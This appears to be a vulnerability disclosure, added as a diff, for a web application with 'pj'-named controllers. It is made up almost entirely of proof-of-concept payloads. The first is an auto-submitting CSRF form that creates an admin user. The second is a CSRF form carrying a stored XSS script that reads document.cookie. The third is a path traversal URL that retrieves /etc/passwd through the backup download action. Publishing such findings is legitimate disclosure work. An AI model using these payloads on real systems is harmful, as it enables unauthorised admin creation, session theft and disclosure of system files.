@@ -1,0 +1,51 @@
+[1] Cross Site Request Forgery
+==============================
+ 
+[Add Admin]
+ 
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="
+http://www.example.com/index.php?controller=pjAdminUsers&action=pjActionCreate">
+<input type="hidden" name="user_create" value="1"/>
+<input type="hidden" name="role_id" value="1"/>
+<input type="hidden" name="email" value="Email@hotmail.com"/>
+<input type="hidden" name="password" value="123456"/>
+<input type="hidden" name="name" value="Iphobos"/>
+<input type="hidden" name="status" value="T"/>
+</form>
+</body>
+</html
+ 
+[2] Cross Site Scripting
+========================
+ 
+# CSRF with XSS Exploit:
+ 
+ 
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0"
+action="www.example.com/index.php?controller=pjAdminRooms&action=pjActionCreate">
+<input type="hidden" name="room_create" value="1"/>
+<input type="hidden" name="i18n[1][name]"
+value="<script>alert(document.cookie);</script>"/>
+<input type="hidden" name="i18n[3][name]" value=""/>
+<input type="hidden" name="i18n[2][name]" value=""/>
+<input type="hidden" name="i18n[1][description]" value="Iphobos"/>
+<input type="hidden" name="i18n[3][description]" value=""/>
+<input type="hidden" name="i18n[2][description]" value=""/>
+<input type="hidden" name="adults" value="1"/>
+<input type="hidden" name="children" value="0"/>
+<input type="hidden" name="cnt" value="1"/>
+</form>
+</body>
+</html>
+ 
+ 
+[3] Local File disclure
+========================
+ 
+http://www.example.com/index.php?controller=pjBackup&action=pjActionDownload&id=../../../../../../../../etc/passwd
+ 
+####################################################################
